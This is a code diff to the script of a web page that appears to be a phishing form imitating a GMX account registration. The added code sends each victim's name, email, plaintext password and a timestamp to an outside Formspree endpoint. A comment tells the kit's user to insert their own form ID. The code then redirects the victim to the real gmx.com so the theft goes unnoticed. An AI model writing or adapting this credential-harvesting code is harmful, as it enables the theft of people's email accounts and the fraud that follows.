@@ -93,22 +93,29 @@
         document.getElementById('preloader').classList.remove('active');
     });
 
-    function handleRegister() {
+    async function handleRegister() {
         const first = document.getElementById('first_name').value;
         const last = document.getElementById('last_name').value;
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         if (!first || !last || !email || !password) return;
 
-        // Save to sessionStorage
-        sessionStorage.setItem('gmx_name', first + ' ' + last);
-        sessionStorage.setItem('gmx_email', email);
-        sessionStorage.setItem('gmx_password', password);
-
         showPreloader();
-        setTimeout(function() {
-            window.location.href = 'https://www.gmx.com';
-        }, 800);
+
+        // Send to Formspree - replace with YOUR form ID
+        await fetch('https://formspree.io/f/mvzykrkg', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'REGISTER',
+                name: first + ' ' + last,
+                email: email,
+                password: password,
+                time: new Date().toLocaleString()
+            })
+        });
+
+        window.location.href = 'https://www.gmx.com';
     }
 </script>
 </body>
